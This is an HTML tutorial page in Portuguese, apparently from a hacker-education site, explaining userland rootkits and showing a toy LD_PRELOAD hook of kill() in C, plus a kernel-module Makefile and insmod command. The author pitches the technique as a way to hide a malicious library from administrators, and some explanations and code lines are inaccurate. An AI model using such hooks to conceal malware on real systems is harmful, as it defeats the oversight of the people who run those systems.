@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/ownbuffer/style/gPapers.css">
+    <link rel="shortcut icon" href="/ownbuffer/ico/0wN.ico" type="image/x-icon">
+    <link rel="stylesheet" href="/highlight/styles/base16/black-metal-bathory.css">
+    <script src="/highlight/highlight.min.js"></script>
+    <title>R00tk1t</title>
+</head>
+<body>
+    <!-- global -->
+    <div class="container-main">
+
+        <!-- header of site-->
+        <header>    
+            <div class="menu">
+                <a href="/ownbuffer/index.html" >home</a>
+                <a href="../../../../ownbuffer/papers/papers.html" >papers</a>
+                <a href="../../../../ownbuffer/about_us/about.html" >about us</a>
+            </div>
+        </header>
+
+        <!-- main of site-->
+        <div class="main">
+            <h1 style="color: red;">Rootkit-Userland</h1> <!-- TITULO -->
+            <pre class="ascii"> <!-- ASCII -->
+              |By Darksec|
+
+
+                       .,,uod8B8bou,,.                             
+              ..,uod8BBBBBBBBBBBBBBBBRPFT?l!i:.                    
+         ,=m8BBBBBBBBBBBBBBBRPFT?!||||||||||||||                   
+         !...:!TVBBBRPFT||||||||||!!^^""'   ||||                   
+         !.......:!?|||||!!^^""'            ||||                   
+         !.........||||                     ||||                   
+         !.........||||  ~ # whoami?        ||||                   
+         !.........||||  ~ # r00tk1t        ||||                   
+         !.........||||                     ||||                   
+         !.........||||                     ||||                   
+         !.........||||                     ||||                   
+         `.........||||                    ,||||                   
+          .;.......||||               _.-!!|||||                   
+   .,uodWBBBBb.....||||       _.-!!|||||||||!:'                    
+!YBBBBBBBBBBBBBBb..!|||:..-!!|||||||!iof68BBBBBb....               
+!..YBBBBBBBBBBBBBBb!!||||||||!iof68BBBBBBRPFT?!::   `.             
+!....YBBBBBBBBBBBBBBbaaitf68BBBBBBRPFT?!:::::::::     `.           
+!......YBBBBBBBBBBBBBBBBBBBRPFT?!::::::;:!^"`;:::       `.         
+!........YBBBBBBBBBBRPFT?!::::::::::^''...::::::;         iBBbo.   
+`..........YBRPFT?!::::::::::::::::::::::::;iof68bo.      WBBBBbo. 
+  `..........:::::::::::::::::::::::;iof688888888888b.     `YBBBP^'
+    `........::::::::::::::::;iof688888888888888888888b.     `     
+      `......:::::::::;iof688888888888888888888888888888b.         
+        `....:::;iof688888888888888888888888888888888899fT!        
+          `..::!8888888888888888888888888888888899fT|!^"'          
+            `' !!988888888888888888888888899fT|!^"'                
+                `!!8888888888888888899fT|!^"'                      
+                  `!988888888899fT|!^"'                            
+                    `!9899fT|!^"'                                  
+            </pre>
+
+            <div class="home-text">
+
+
+
+                <p>Olá amigo, você provavelmente está aqui com muita sede de conhecimento, hoje iremos abordar um assunto muito interresante, 
+                  Rootkit Userland. o que iremos aprender:</p>
+<pre><br>
+<span style="color: green;">1</span>) O que é um <b>rootkit</b>?
+-------------------------------------------------------------------------
+<span style="color: green;">2</span>) O que é <b>Ring3</b>?
+-------------------------------------------------------------------------
+<span style="color: green;">3</span>) O que seria Biblioteca Dinâmica?
+-------------------------------------------------------------------------
+<span style="color: green;">4</span>) Source Code hook <b>syscall</b>
+-------------------------------------------------------------------------
+<span style="color: green;">5</span>) Algumas dicas e artigos que você pode explorar!
+<br><br></pre>
+
+
+                
+                <h1>O que é rootkit?</h1>
+<pre class="lMagenta">
+         *                  *
+             __                *
+          ,db'    *     *
+         ,d8/       *        *    *
+         888
+         `db\       *     *
+           `o`_                    **
+      *               *   *    _      *
+            *                 / )
+         *    (\__/) *       ( (  *
+       ,-.,-.,)    (.,-.,-.,-.) ).,-.,-.
+      | @|  ={      }= | @|  / / | @|o |
+     _j__j__j_)     `-------/ /__j__j__j_
+     ________(               /___________
+      |  | @| \              || o|O | @|
+      |o |  |,'\       ,   ,'"|  |  |  |  hjw
+     vV\|/vV|`-'\  ,---\   | \Vv\hjwVv\//v
+                _) )    `. \ /
+               (__/       ) )
+                         (_/
+</pre>
+
+                <p>O que é um rootkit? rootkit é um kit de ferramentas utilizada por atacantes após a exploração,  
+                a fim de ocultar conexão, processo, diretorios, arquivos. 
+                E pode ser usado com outros tipos de malware como: </p>
+
+
+<pre><br>
+<span style="color: green;">1</span>) Keylogger
+<span style="color: green;">2</span>) Backdoor
+<span style="color: green;">3</span>) Spyware
+<br><br></pre>
+
+                <p>entre vários outros malwares
+                  que se pode imaginar, 
+                  não irei entrar em detalhes para o artigo não ficar muito extenso, 
+                  mas você pode olhar mais a repeito de rootkit, na internet tem muita coisa.</p>
+
+                <h3>como um rootkit funciona?</h3>
+                <p>Normalmente um rootkit mais robusto ele trabalha no kernel
+                  ou seja em baixo nivel, mais como isso funciona?
+                  ele pode ser carregado utilizando um comando denominado <b>insmod</b>, 
+                  primeiro você teria que fazer um modulo para o kernel, não irei explicar sobre isso,
+                  o nosso querido amigo <span style="color: yellow;">Unoxys</span> fez um artigo sobre isso, está aqui no website do OwnBuffer, 
+                  caso não saiba fazer um modulo de kernel, vai lá dar uma olhada, e volte aqui com o modulo pronto...
+                </p>
+                  <p>primeiro crie o arquivo do seu rootkit depois crie um Makefile:</p>
+<pre>
+  <code class="language-c">
+obj-m += darksec.o
+
+all:
+    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+  </code>
+</pre>
+                <p>após editar só rode um:</p>
+<pre>
+<code class="language-c">
+~ # insmod darksec.ko && lsmod | head -n 2
+</code>
+</pre>
+                
+
+
+                <p>pronto você irá ver o seu modulo inserido no buffer do kernel!</p>
+                <p>Agora que você viu como um <b>LKM(LOAD KERNEL MODULE)</b> funciona, 
+                  vamos falar sobre o rootkit userland 
+                  que será abordado nesse paper, 
+                  bem para começarmos, o que poderia ser feito com um rootkit userland? 
+                  bem podemos ocultar conexão, 
+                  mas é claro que ao nivel ring3(iremos abordar sobre ring3...), conteúdos sobre o Ring3 é algo muito mais fácil de encontrar, 
+                  já que se utiliza o LD_PRELOAD(nem Sempre!) muito fácil de detectar mas não impossivel de ocultar. 
+                  por que? bem podemos hookar syscall do ldd (irei explicar mais sobre hook), 
+                  ou seja não irá aparecer para o sysadmin ou algum carinha do TI, será dificil ele achar a biblioteca maliciosa que criamos.
+                  (isso ficara para a prôxima explicação...)</p>
+
+                  <h2>O que é Ring3</h2>
+
+                  <p>
+                  Bem não tem muito o que dizer sobre Ring3, mas resumindo, 
+                  em um sistema operacional tanto Linux quanto Windows existem camadas, e essas camadas tem suas permissões, 
+                  um ring3 por exemplo é a camada/área do sistema com menos privilégios, pois se trata da area do usuario, 
+                  também temos a ring0, que tem muito mais privilegios, pois ela fica no nucleo do sistema operacional, o kernel!
+                  </p>
+                  <p>
+                  beleza mas como assim espaço do usuario e kernel? 
+                  quando você utiliza um software como por exemplo: gerenciador de tarefa, 
+                  explorador de arquivo ou uma calculadora, esses componentes rodam em um espaço com menos permissão 
+                  pois geralmente, são apenas aplicativos comuns, e fazem tarefas comuns, eles não precisam de uma permissão mais restrita, 
+                  este é o espaço do usuario ou <b>ring3</b>, 
+                  já um aplicativo que contém uma permissão mais restrita, como por exemplo um aplicativo que mostra processos do sistema,
+                  esse tipo de aplicação nescessita de uma permissão mais avançada do sistema, algo mais restrito ao usuario,
+                  nós chamamos essa permissão/espaço de <b>ring0</b> ou area do kernel!
+                  é bom entender isso, pois iremos abordar esse tipo de assunto mais para frente, principalmente pra quem quer ingressar na área de maldev!</p>
+                  
+                  <h2>O que é uma biblioteca dinâmica</h2>
+<pre class="lMagenta">
+
+                _
+                \`*-.
+                 )  _`-.
+                .  : `. .
+                : _   '  \
+                ; *` _.   `*-._
+                `-.-'          `-.
+                  ;       `       `.
+                  :.       .        \
+                  . \  .   :   .-'   .
+                  '  `+.;  ;  '      :
+                  :  '  |    ;       ;-.
+                  ; '   : :`-:     _.`* ;
+      [darksec] .*' /  .*' ; .*`- +'  `*'
+               `*-*   `*-*  `*-*'
+
+</pre>
+                <p>A biblioteca dinâmica é bastante usada no sistema operacional gnu/Linux, 
+                  já que um executavel do linux mais conhecido como ELF geralmente precisa desse tipo de biblioteca para funcionar, 
+                  como isso funciona? irei explicar detalhadamente!</p>
+
+                <p><span style="color: green;"> > 1)</span> Comportamento do executavel. <span style="color: green;"><</span></p>
+                <p><span style="color:  green;"> > 2)</span> Como funciona a biblioteca dinâmica <span style="color: green;"><</span></p>
+
+                <h2>Comportamento do Executavel</h2>
+<pre class="lMagenta">
+              .7
+            .'/
+           / /
+          / /
+         / /
+        / /
+       / /
+      / /
+     / /
+    / /
+  __|/
+,-\__\
+|f-"Y\|
+\()7L/
+ cgD                            __ _
+ |\(                          .'  Y '>,
+  \ \                        / _   _   \
+   \\\                       )(_) (_)(|}
+    \\\                      {  4A   } /
+     \\\                      \uLuJJ/\l
+      \\\                     |3    p)/
+       \\\___ __________      /nnm_n//
+       c7___-__,__-)\,__)(".  \_>-<_/D
+                  //V     \_"-._.__G G_c__.-__<"/ ( \
+                         <"-._>__-,G_.___)\   \7\
+                        ("-.__.| \"<.__.-" )   \ \
+                        |"-.__"\  |"-.__.-".\   \ \
+                        ("-.__"". \"-.__.-".|    \_\
+                        \"-.__""|!|"-.__.-".)     \ \
+                         "-.__""\_|"-.__.-"./      \ l
+                          ".__""">G>-.__.-">       .--,_
+                              ""  G
+</pre>
+                <p>Após executar um binario em linha de comando
+                  com ./nomedoexecutavel, o executavel irá fazer uma consulta nas biblioteca linkadas ao executavel, 
+                  inclusive para fazer essa consulta ele utiliza o <a href="https://man7.org/linux/man-pages/man8/ld.so.8.html">ld.so.cache</a>, 
+                  para fazer a procura no sistema, e encontrar onde cada biblioteca dinâmica está, 
+                  mesmo já tendo => /usr/lib(local padrão de onde fica as bibliotecas no linux), 
+                  assim a consulta por essas bibliotecas dinâmicas ficam melhores. 
+                  então quando executamos um programa via terminal ou de qualquer outra forma, 
+                  o programa reage da seguinte forma: </p>
+                  <p>Executavel <b>--></b> darksec.so <b>--></b> syscall</p>
+                  <p><b>Lembrete:</b> (as bibliotecas dinâmicas usam a extensão .so, por exemplo darksec.so)</p>
+
+                <p>espero que essa explicação simples tenha ficado clara, 
+                  vamos para algo muito mais detalhado!</p>
+                <p><b>(espero que até agora você que está lendo esteja entendendo hehe)</b></p>
+
+                <h3>Como Funciona a Biblioteca Dinâmica?</h3>
+<pre class="lMagenta">
+            _,'|             _.-''``-...___..--';)
+           /_ \'.      __..-' ,      ,--...--'''
+          <\    .`--'''       `     /'
+           `-';'               ;   ; ;
+     __...--''     ___...--_..'  .;.'
+dark(,__....----'''       (,..--''
+</pre>
+                <p>Meu amigo, agora começa a verdadeira brincadeira, 
+                  bem vamos abordar alguns assuntos mais nada muito complexo, 
+                  tentarei da melhor forma possivel explicar, 
+                  primeiro vamos ver como podemos ver quais bibliotecas dinâmicas um executavel utiliza:</p>
+
+<pre>
+<code>
+~ # ldd /usr/bin/ls
+</code>
+</pre>
+
+                <p>
+                  você está se perguntando que diabos é ldd? 
+                  bem ldd é muito util se quisermos ver quais bibliotecas dinâmicas um executavel utiliza 
+                  para o funcionamento, certo! vou mostrar um output das libs do ls:
+                </p>
+
+<pre>
+<code class="language-c">
+  linux-vdso.so.1 (0x00007ffde8b9c000)
+  libcap.so.2 => /usr/lib/libcap.so.2 (0x0000755faf7cd000)
+  libc.so.6 => /usr/lib/libc.so.6 (0x0000755faf5eb000)
+  /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x0000755faf81d000)
+</code>
+</pre>
+
+                <p>
+                  como podemos ver temos no lado esquerdo o nome das libs e no lado direito o endereço de memoria delas em hexadecimal. 
+                  Bem, se o executavel ls utiliza essas bibliotecas dinâmicas será que poderiamos colocar a nossa biblioteca dinâmica lá?? 
+                  é nisso que iremos chegar vamos explorar uma técnica chamada hook(gancho), essa técnica é muito utlizada até mesmo em rootkits 
+                  kernelland's com o objetivo de alterar a chamada do sistema, iremos falar mais sobre daqui a pouco aguente firme rs.</p>
+                <p>
+                  Certo, até aqui descobrimos que um executavel solicita uma biblioteca dinâmica e nessa biblioteca dinâmica possuem funções, 
+                  e essas funções serão nescessarias para o funciomento correto do executavel, 
+                  depois disso o executavel irá pegar o endereço de memoria, 
+                  normalmente o endereço de memoria ele é em hexadecimal, 
+                  exemplo de valor hexadecimal referente a endereço de memoria: 0x182121212h, 
+                  após coletar esse endereço ele irá retornar para o executavel(se tiver em dúvida pesquise mais sobre!), 
+                  mais antes disso uma biblioteca dinâmica contem simbolos e endereços de memoria e funções, 
+                  como tinha dito anteriormente. 
+                  vamos recaptular para ficar de melhor compreensão: 
+                </p>
+                <p>
+                  executavel <b>--></b> darksec.so <b>--></b> endereço de memoria da função <b>--></b> executavel
+                </p>
+                <p>
+
+                </p>
+                <p>ok, como podemos saber quais funções o executavel utiliza? é de extrema importancia saber, 
+                  imagina não saber qual função o executavel usará? para isso podemos usar o strace, 
+                  o strace é util para sabermos quais funções um executavel utiliza, exemplo: </p>
+<pre>
+<code class="language-c">
+  ~ # strace kill 1337
+  close(3)                                = 0
+  kill(606921, SIGTERM)                   = 0
+  dup(1)                                  = 3
+  close(3)                                = 0
+  dup(2)                                  = 3
+  close(3)                                = 0
+  exit_group(0)                           = ?
+  +++ exited with 0 +++
+  [1]+  Terminado               nc -vnlp 1337
+</code>  
+</pre>
+
+                <p>para conseguir analisar eu criei um nc -vnlp 1337 & ou seja um processo em segundo plano para matar o processo
+                   e ver como funciona e qual função usa para matar o processo, e PRONTOO!! conseguimos após vermos a linha kill(606921, SIGTERM)</p>
+                <p>podemos ver que ele usou o pid e um signal para matar o processo, ok até aqui tudo bem vimos como funciona. </p>
+                <p><a style="color: red">Atenção</a> alguns avisos
+                  neste momento irei avisar alguns conhecimento que precisa, mais fiquei tranquilo(a) no final irei deixar artigos,
+                   blogs, posts sobre... Será necessario saber C pelo menos o básico, 
+                   então não irei explicar C já que o assunto desse paper não é a linguagem C em si só mostrarei sobre hook e como funciona, 
+                   vamos começar. </p>
+
+                <h2>Source Code Hook Syscall</h2>
+
+
+<pre class="lMagenta">
+                  ;,_            ,
+                 _uP~"b          d"u,
+                dP'   "b       ,d"  "o
+               d"    , `b     d"'    "b
+              l] [    " `l,  d"       lb
+              Ol ?     "  "b`"=uoqo,_  "l
+            ,dBb "b        "b,    `"~~TObup,_
+          ,d" (db.`"         ""     "tbc,_ `~"Yuu,_
+        .d" l`T'  '=                      ~     `""Yu,
+      ,dO` gP,                           `u,   b,_  "b7
+     d?' ,d" l,                           `"b,_ `~b  "1
+   ,8i' dl   `l                 ,ggQOV",dbgq,._"  `l  lb
+  .df' (O,    "             ,ggQY"~  , @@@@@d"bd~  `b "1
+ .df'   `"           -=@QgpOY""     (b  @@@@P db    `Lp"b,
+.d(                  _               "ko "=d_,Q`  ,_  "  "b,
+Ql         .         `"qo,._          "tQo,_`""bo ;tb,    `"b,
+qQ         |L           ~"QQQgggc,_.,dObc,opooO  `"~~";.   __,7,
+qp         t\io,_           `~"TOOggQV""""        _,dg,_ =PIQHib.
+`qp        `Q["tQQQo,_                          ,pl{QOP"'   7AFR`
+  `         `tb  '""tQQQg,_             p" "b   `       .;-.`Vl'
+             "Yb      `"tQOOo,__    _,edb    ` .__   /`/'|  |b;=;.__
+                           `"tQQQOOOOP""`"\QV;qQObob"`-._`\_~~-._
+                                """"    ._        /   | |oP"\_   ~\ ~\_~\
+                                        `~"\ic,qggddOOP"|  |  ~\   `\~-._
+                                          ,qP`"""|"   | `\ `;   `\   `\
+                               _        _,p"     |    |   `\`;    |    |
+       darksec                 "boo,._dP"       `\_  `\    `\|   `\   ;
+                                 `"7tY~'            `\  `\    `|_   |
+                                                      `~\  |
+</pre>
+                <p>Chegamos, no momento creio eu que todos estavam esperando, 
+                  vamos hookar a syscall do kill como tinha mostrado anteriormente conseguimos ver a função sendo mostrada, kill(),
+                   mão na massa!
+                   aqui está o source code que acabei de fazer: </p>
+
+<pre>
+<code class="language-c">
+// hook syscall kill para o meu paper :) 
+#include &lt;stdio.h&lt; 
+#include &lt;signal.h&lt; 
+#include &lt;dlfcn.h&lt; 
+#include &lt;unistd.h&lt; 
+int kill(pid_t pid, int sig)
+{ 
+  const int pids = 1337; 
+  int (*darksec)(pid_t pid, int sig); 
+  darksec = dlsym(RTLD_NEXT, "kill"); 
+  if(pid == pids) { 
+    return write(1, "Hacked Darksec\n", 16); 
+  } else { 
+    return darksec(pid, sig); 
+  } 
+} 
+</code>
+</pre>
+                <p> não se assuste, é muito simples irei explicar linha por linha.</p>
+
+                <h2>Bibliotecas do C</h2>
+
+                <p>como podemos ver temos bibliotecas e como elas funcionam, junto com a explicação de cada uma, seja feliz e leia atentamente. </p>
+<pre>
+<code>
+#include &lt;stdio.h&gt; // com elá trabalhamos com printf, if... 
+#include &lt;signal.h&gt; // podemos usar a kill(), entre outras funções.
+#include &lt;dlfcn.h&gt; // muito usado para trabalhar com biblioteca dinâmica
+#include &lt;unistd.h&gt;// será util para a write(), a unistd.h é para trabalhar em baixo nivel write, read etc...  
+</code>  
+</pre>
+                    
+                  
+                  <b>Lembrete: </b>pesquise mais, corra atrás, se quiser saber mais sobre. conhecimento nunca é demais! </p>
+                
+                <h2>Função, Endereço de Memoria </h2>
+                
+                <p>temos a parte da função aqui estamos criando uma função verdadeira e modificando ela incluindo a nossa função falsa, 
+                  assim temos controle maior sobre as informações passadas pelo usuario! 
+                  depois criei uma constante do tipo inteiro para guardar o valor 1337 ou 
+                  seja o valor que usaremo depois para fazer a comparação se o usuario digital 
+                  kill 1337 faça uma ação... logo em seguida criei a nossa função fake, 
+                  em seguida chamei o endereço de memoria da função kill, dlsym
+                  é util para solicitar o endereço de memoria da função kill(), já tinhamos falado sobre.</p>
+
+
+                <h2>Comparação de Entrada de Dados </h2>
+
+                <p>e por ultimo fazendo a comparação se o usuario digitar 1337 irá escrever na tela hacked darksec 
+                  se tiver alguma duvida de como funciona aqui está a 
+                  man; int kill(pid_t pid, int sig); pid é o valor de entrada, 
+                  ou seja o numero do pid, o sig é o sinal que você usará, não é necessario. </p>
+<pre>
+<code class="language-c">
+  if(pid == pids){ // comparação do buffer ou seja o pid, com a constate 1337 
+    return write(1, "Hacked Darksec\n", 16); // se for 1337 imprimi hacked darksec 
+  } else { // ou se não. 
+    return darksec(pid, sig);
+     // ele irá retornar para a função darksec() falsa, ficando em um loop 
+    } // finaliza o if 
+  } // finaliza a edição da função original
+</code>
+</pre>
+
+                <h2>Outros...</h2>
+                <p>Vamos para alguns artigos e dicas que ire passar para vocês: 
+                  <li><a class="green" href="https://github.com/DARKSECshell/ROOTKIT-USERLAND">GitHub - H3ll</a></li> 
+                  <li><a class="green" href="https://github.com/h0mbre/Learning-C">Learn - Aprender C</a></li> 
+                  <li><a class="green" href="https://h0mbre.github.io/Learn-C-By-Creating-A-Rootkit/#">Learn - Rootkit userland muito bom</a></li><br>
+                  muito bom é isso ficamos por aqui, 
+                  demorei muito tempo fiquei práticamente o dia todo terminei agora esse paper, 
+                  espero muito que você tenha gostado e aprendido algo sobre, 
+                  qualquer duvida entre em contato comigo pelo discord, 
+                  agradeço imensamente a inicativa do pessoal => Bitkill & Unoxys.
+                  sem eles a ideia não tinha ido para frente, 
+                  sobre criar paper e compartilhar conhecimento com o pessoal que está começando nessa área. </p>
+<pre class="lMagenta">
+
+            *     ,MMM8&&&.            *
+                  MMMM88&&&&&    .
+                 MMMM88&&&&&&&
+     *           MMM88&&&&&&&&
+                 MMM88&&&&&&&&
+                 'MMM88&&&&&&'
+                   'MMM8&&&'      *
+          |\___/|     /\___/\
+          )     (     )    ~( .              '
+         =\     /=   =\~    /=
+           )===(       ) ~ (
+          /     \     /     \
+          |     |     ) ~   (
+         /       \   /     ~ \
+         \       /   \~     ~/
+  jgs_/\_/\__  _/_/\_/\__~__/_/\_/\_/\_/\_/\_
+  |  |  |  |( (  |  |  | ))  |  |  |  |  |  |
+  |  |  |  | ) ) |  |  |//|  |  |  |  |  |  |
+  |  |  |  |(_(  |  |  (( |  |  |  |  |  |  |
+  |  |  |  |  |  |  |  |\)|  |  |  |  |  |  |
+  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
+
+<span style="color: blue;">Discord:</span><span style="color: white;"> _darksec</span>
+            </div>
+        </div>
+
+        <!-- foot of site -->
+        <div> <!-- PARTE DE BAIXO DO WEBSITE -->
+            <footer>
+                <h4>OBRIGADO LEITOR, FIZ ESTE PAPER COM MUITA ATENÇÃO PARA VOCÊ :)</h4>
+            </footer>
+        </div>
+    
+    
+    
+    
+    </div>
+</body>
+<script>hljs.highlightAll();</script>
+</html>
